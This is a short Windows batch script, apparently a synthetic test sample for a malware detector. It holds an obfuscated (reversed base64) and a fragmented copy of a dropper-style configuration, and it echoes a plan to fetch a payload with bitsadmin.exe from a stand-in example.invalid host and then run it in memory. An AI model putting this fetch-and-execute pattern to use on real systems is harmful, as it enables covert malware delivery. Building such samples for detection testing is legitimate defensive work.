@echo off
setlocal EnableExtensions EnableDelayedExpansion
rem HUNTRESS-CODEC:base64_literal|reverse
rem HUNTRESS-MATERIAL:dGFkLjcxZjVjMGY5L2RpbGF2bmkuZWxwbWF4ZS44YjJjY2FkZDkwLy86c3B0dGg9bHJ1fDhiMmNjYWRkOTAtbmdpYXBtYWM9ZGlfbmdpYXBtYWN8ZW5vbj1lZ2F1Z25hbF90eGVufHlydGVyX2tjYWJsbGFmPWhwYXJnfDE9dG51b2NfZWdhdHN8ZXhlLm5pbWRhc3RpYj1yZXRwYWRhfHlyb21lbV9oY3RhcHNpZCxldG9tZXJfZXJpdXFjYT1zcGV0c3wxPXY=
rem HUNTRESS-EXTENSION:bat
if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT
if /i "%~1"=="--plan" goto :HUNTRESS_PLAN
exit /b 0
:HUNTRESS_INSPECT
set fragment0=v=1^|steps=acquire_remote,dispatch_memory^|adapter=b
set fragment1=itsadmin.exe^|stage_count=1^|graph=fallback_retry^|ne
set fragment2=xt_language=none^|campaign_id=campaign-09ddacc2b8^|u
set fragment3=rl=https://09ddacc2b8.example.invalid/9f0c5f17.dat
goto :HUNTRESS_SEPARATOR_DONE
ver >nul & rem HUNTRESS separator ampersand
:HUNTRESS_SEPARATOR_DONE
rem no neutral statements
set "recovered_configuration=%fragment0%%fragment1%%fragment2%%fragment3%"
echo(!recovered_configuration!
exit /b 0
:HUNTRESS_UNUSED
goto :HUNTRESS_PLAN
:HUNTRESS_PLAN
echo bitsadmin.exe GET https://09ddacc2b8.example.invalid/9f0c5f17.dat then dispatch memory
exit /b 0
